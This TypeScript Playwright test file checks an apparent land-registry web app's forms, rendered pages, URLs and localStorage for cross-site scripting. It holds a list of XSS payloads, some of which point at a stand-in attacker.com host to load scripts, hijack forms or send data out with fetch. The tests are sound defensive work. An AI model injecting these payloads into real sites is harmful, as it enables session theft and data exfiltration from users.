/**
 * frontend/__tests__/security/xss-injection.test.ts
 *
 * Frontend XSS (Cross-Site Scripting) security tests using Playwright.
 * Tests various XSS attack vectors in frontend forms and rendering.
 */

import { test, expect } from '@playwright/test';

const BASE_URL = 'http://localhost:3000';

// ──────────────────────────────────────────────────────────────────────────────
// XSS PAYLOAD VECTORS
// ──────────────────────────────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  // Script tag injections
  '<script>alert("XSS")</script>',
  '<SCRIPT>alert("XSS")</SCRIPT>',
  '<script src="http://attacker.com/xss.js"></script>',

  // Event handler injections
  'javascript:alert("XSS")',
  'onclick="alert(\'XSS\')"',
  'onmouseover="alert(\'XSS\')"',
  'onerror="alert(\'XSS\')"',
  'onload="alert(\'XSS\')"',

  // Image tag with event
  '<img src=x onerror=alert("XSS")>',
  '<img src="x" onerror="alert(\'XSS\')" />',

  // SVG vectors
  '<svg onload="alert(\'XSS\')">',
  '<svg><script>alert("XSS")</script></svg>',

  // Input tag vectors
  '<input onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',

  // Form action hijacking
  '<form action="http://attacker.com"><input type="submit"></form>',

  // Data URI vectors
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJlF1b3Q7WFNTJlF1b3Q7KT4=">',

  // HTML entity encoding bypass
  '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',

  // Unicode encoding
  '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',

  // Protocol handlers
  '<a href="javascript:alert(\'XSS\')">Click me</a>',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',

  // CSS injection
  '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
  '<p style="background:url(javascript:alert(\'XSS\'))">test</p>',

  // Meta tag injection
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',

  // Base tag hijacking
  '<base href="http://attacker.com/">',

  // Link tag injection
  '<link rel="stylesheet" href="http://attacker.com/xss.css">',

  // Comment-based XSS
  '<!-- <script>alert("XSS")</script> -->',

  // Null byte injection
  'javascript\\x00:alert("XSS")',
];

// ──────────────────────────────────────────────────────────────────────────────
// 1. XSS IN TEXT INPUTS
// ──────────────────────────────────────────────────────────────────────────────

test.describe('XSS Prevention in Form Inputs', () => {
  test('should not execute XSS in land owner name field', async ({ page }) => {
    await page.goto(`${BASE_URL}/register`);

    for (const payload of XSS_PAYLOADS) {
      const ownerNameInput = page.locator('input[placeholder*="owner"]');

      if (await ownerNameInput.isVisible()) {
        await ownerNameInput.fill(payload);

        // Verify script does not execute
        let scriptExecuted = false;
        page.on('popup', () => {
          scriptExecuted = true;
        });

        // Trigger form submission
        const submitBtn = page.locator('button[type="submit"]');
        if (await submitBtn.isVisible()) {
          await submitBtn.click();
        }

        // Assert script did not execute
        expect(scriptExecuted).toBeFalsy();
      }
    }
  });

  test('should not execute XSS in location/address fields', async ({ page }) => {
    await page.goto(`${BASE_URL}/register`);

    const locationInput = page.locator('input[placeholder*="location"], input[placeholder*="address"]');

    if (await locationInput.isVisible()) {
      for (const payload of XSS_PAYLOADS.slice(0, 5)) {
        await locationInput.fill(payload);

        const content = await locationInput.inputValue();
        // Verify content is escaped or sanitized
        expect(content).not.toContain('<script>');
      }
    }
  });

  test('should not execute XSS in document hash field', async ({ page }) => {
    await page.goto(`${BASE_URL}/register`);

    const hashInput = page.locator('input[placeholder*="hash"], input[placeholder*="document"]');

    if (await hashInput.isVisible()) {
      for (const payload of XSS_PAYLOADS.slice(0, 3)) {
        await hashInput.fill(payload);

        const content = await hashInput.inputValue();
        expect(content).not.toContain('<script>');
        expect(content).not.toContain('onerror');
      }
    }
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// 2. XSS IN RENDERED DATA
// ──────────────────────────────────────────────────────────────────────────────

test.describe('XSS Prevention in Rendered Content', () => {
  test('should safely render land parcel data without executing scripts', async ({ page }) => {
    await page.goto(`${BASE_URL}/dashboard`);

    // Look for displayed land cards
    const landCards = page.locator('[data-testid="land-card"]');

    if (await landCards.count() > 0) {
      const cardContent = await landCards.first().textContent();

      // Verify no script tags are visible in rendered content
      expect(cardContent).not.toContain('<script>');
      expect(cardContent).not.toContain('javascript:');
    }
  });

  test('should escape HTML in land owner names', async ({ page }) => {
    await page.goto(`${BASE_URL}/dashboard`);

    // Verify all text nodes don't contain unescaped HTML
    const bodyContent = await page.locator('body').innerHTML();

    // Check for raw script tags (properly escaped should show as &lt;script&gt;)
    expect(bodyContent).not.toContain('<script>');
    expect(bodyContent).not.toContain('onclick=');
  });

  test('should not render data with event handlers', async ({ page }) => {
    await page.goto(`${BASE_URL}/dashboard`);

    const pageHTML = await page.content();

    // Check for dangerous patterns
    const dangerousPatterns = [
      /on\w+\s*=\s*"[^"]*alert/i,
      /javascript:\s*alert/i,
      /data:text\/html/i,
    ];

    for (const pattern of dangerousPatterns) {
      expect(pageHTML).not.toMatch(pattern);
    }
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// 3. XSS IN URLS & REDIRECTS
// ──────────────────────────────────────────────────────────────────────────────

test.describe('XSS Prevention in URLs & Navigation', () => {
  test('should not follow javascript: protocol in redirects', async ({ page }) => {
    // Try to navigate to javascript: URL
    const response = await page.goto('javascript:alert("XSS")', {
      waitUntil: 'domcontentloaded',
    }).catch(() => null);

    // Should not execute
    expect(page.url()).not.toContain('javascript:');
  });

  test('should sanitize query parameters', async ({ page }) => {
    const xssParam = encodeURIComponent('<script>alert("XSS")</script>');
    await page.goto(`${BASE_URL}/search?q=${xssParam}`);

    // Verify script doesn't execute
    let executed = false;
    page.once('popup', () => {
      executed = true;
    });

    await page.waitForTimeout(500);
    expect(executed).toBeFalsy();
  });

  test('should not allow data: URIs in iframes', async ({ page }) => {
    await page.goto(`${BASE_URL}/`);

    const iframes = page.locator('iframe');
    const count = await iframes.count();

    for (let i = 0; i < count; i++) {
      const src = await iframes.nth(i).getAttribute('src');
      expect(src).not.toMatch(/^data:/i);
    }
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// 4. DOM CLOBBERING ATTACKS
// ──────────────────────────────────────────────────────────────────────────────

test.describe('DOM Clobbering Protection', () => {
  test('should not allow overwriting global variables via named elements', async ({ page }) => {
    await page.goto(`${BASE_URL}/`);

    // Inject element with id matching global variable
    await page.evaluate(() => {
      const elem = document.createElement('div');
      elem.id = 'alert'; // Try to shadow window.alert
      document.body.appendChild(elem);
    });

    // Verify window.alert is still the native function
    const isNative = await page.evaluate(() => typeof window.alert === 'function');
    expect(isNative).toBeTruthy();
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// 5. STORED XSS TEST
// ──────────────────────────────────────────────────────────────────────────────

test.describe('Stored XSS Prevention', () => {
  test('should not store or render executable scripts', async ({ page }) => {
    await page.goto(`${BASE_URL}/register`);

    const payload = '<img src=x onerror="fetch(\'http://attacker.com/steal\')">';

    // Try to submit form with XSS payload
    const ownerInput = page.locator('input[name="ownerName"]', {hasText: 'Owner'});
    if (await ownerInput.isVisible()) {
      await ownerInput.fill(payload);

      // Don't actually submit - just verify input is safe
      const value = await ownerInput.inputValue();
      expect(value).not.toContain('onerror=');
    }
  });

  test('should sanitize data before storing in localStorage', async ({ page }) => {
    await page.goto(`${BASE_URL}/`);

    // Check localStorage contents
    const storage = await page.evaluate(() => {
      const items: Record<string, unknown> = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (key) {
          items[key] = window.localStorage.getItem(key);
        }
      }
      return items;
    });

    // Verify no unescaped HTML/scripts in localStorage
    Object.values(storage).forEach((value) => {
      if (typeof value === 'string') {
        expect(value).not.toContain('<script>');
      }
    });
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// 6. ATTRIBUTE-BASED XSS
// ──────────────────────────────────────────────────────────────────────────────

test.describe('Attribute-Based XSS Prevention', () => {
  test('should escape quotes in HTML attributes', async ({ page }) => {
    await page.goto(`${BASE_URL}/dashboard`);

    const pageHTML = await page.content();

    // Check for unescaped quotes in attributes that could break context
    expect(pageHTML).not.toMatch(/href="[^"]*"[^"]*onclick/i);
  });

  test('should not allow direct HTML assignment in attributes', async ({ page }) => {
    await page.goto(`${BASE_URL}/`);

    // Try various attribute injection patterns
    const testPatterns = [
      'src="x" data-something="<script>alert(1)</script>"',
      'title="<img src=x onerror=alert(1)>"',
      'aria-label="x" onclick="alert(1)"',
    ];

    const html = await page.content();
    for (const pattern of testPatterns) {
      expect(html).not.toContain(pattern);
    }
  });
});
